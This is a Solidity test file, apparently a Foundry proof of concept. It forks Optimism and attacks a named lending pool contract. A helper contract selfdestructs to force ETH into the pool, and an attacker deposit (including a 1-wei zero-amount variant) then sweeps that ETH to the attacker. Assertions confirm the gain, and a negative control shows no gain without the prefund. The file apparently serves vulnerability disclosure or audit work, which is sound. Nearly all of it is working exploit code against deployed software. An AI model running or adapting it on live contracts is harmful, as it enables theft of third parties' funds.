// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface Vm {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function deal(address, uint256) external;
    function prank(address) external;
}

interface ILendingPoolPoC {
    function deposit(uint256 reserveId, uint256 amount, address onBehalfOf, uint16 referralCode)
        external payable returns (uint256);
    function getETokenAddress(uint256 reserveId) external view returns (address);
    function paused() external view returns (bool);
    function WETH9() external view returns (address);
}

interface IERC20Balance { function balanceOf(address) external view returns (uint256); }

contract ForceSender {
    constructor() payable {}
    function force(address payable target) external { selfdestruct(target); }
}

contract RefundETHSweepTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    ILendingPoolPoC constant POOL = ILendingPoolPoC(0xBB505c54D71E9e599cB8435b4F0cEEc05fC71cbD);
    uint256 constant FORK_BLOCK = 157500563;
    uint256 constant B = 1 ether;
    uint256 constant DEPOSIT = 1 ether;
    address constant DONOR = address(0xD0110);
    address constant ATTACKER = address(0xA771AC);

    event Snapshot(string run, string phase, uint256 donorETH, uint256 poolETH, uint256 attackerETH, uint256 attackerEToken);

    function setUp() public {
        vm.createSelectFork("optimism", FORK_BLOCK);
        require(!POOL.paused(), "pool paused");
        require(POOL.WETH9() == 0x4200000000000000000000000000000000000006, "wrong WETH");
    }

    function _snapshot(string memory run, string memory phase, address etoken) internal {
        emit Snapshot(run, phase, DONOR.balance, address(POOL).balance, ATTACKER.balance, IERC20Balance(etoken).balanceOf(ATTACKER));
    }

    function testAttackForcedThirdPartyETHIsSwept() public {
        address etoken = POOL.getETokenAddress(1);
        vm.deal(DONOR, B);
        vm.deal(ATTACKER, DEPOSIT);
        _snapshot("attack", "before-force", etoken);

        vm.prank(DONOR);
        ForceSender forceSender = new ForceSender{value: B}();
        forceSender.force(payable(address(POOL)));
        _snapshot("attack", "after-force", etoken);
        require(address(POOL).balance == B, "force funding failed");

        vm.prank(ATTACKER);
        uint256 minted = POOL.deposit{value: DEPOSIT}(1, DEPOSIT, ATTACKER, 0);
        _snapshot("attack", "after-deposit", etoken);

        require(address(POOL).balance == 0, "pool retained forced ETH");
        require(ATTACKER.balance == B, "attacker did not receive forced balance");
        require(minted > 0 && IERC20Balance(etoken).balanceOf(ATTACKER) == minted, "deposit principal not represented");
    }

    function testCanonicalZeroAmountOneWeiTrigger() public {
        address etoken = POOL.getETokenAddress(1);
        vm.deal(DONOR, B);
        vm.deal(ATTACKER, 1 wei);
        vm.prank(DONOR);
        ForceSender forceSender = new ForceSender{value: B}();
        forceSender.force(payable(address(POOL)));
        _snapshot("canonical-zero", "after-force", etoken);

        vm.prank(ATTACKER);
        uint256 minted = POOL.deposit{value: 1 wei}(1, 0, ATTACKER, 0);
        _snapshot("canonical-zero", "after-deposit", etoken);
        require(address(POOL).balance == 0, "pool retained forced ETH");
        require(ATTACKER.balance == B + 1 wei, "aggregate B+1 refund absent");
        require(minted == 0 && IERC20Balance(etoken).balanceOf(ATTACKER) == 0, "unexpected mint");
    }

    function testNegativeControlNoPrefundNoGain() public {
        address etoken = POOL.getETokenAddress(1);
        vm.deal(DONOR, B);
        vm.deal(ATTACKER, DEPOSIT);
        _snapshot("control", "before-deposit", etoken);

        vm.prank(ATTACKER);
        uint256 minted = POOL.deposit{value: DEPOSIT}(1, DEPOSIT, ATTACKER, 0);
        _snapshot("control", "after-deposit", etoken);

        require(address(POOL).balance == 0, "unexpected pool ETH");
        require(ATTACKER.balance == 0, "unexpected native refund/gain");
        require(minted > 0 && IERC20Balance(etoken).balanceOf(ATTACKER) == minted, "deposit differs from attack path");
        require(DONOR.balance == B, "donor participated in control");
    }
}
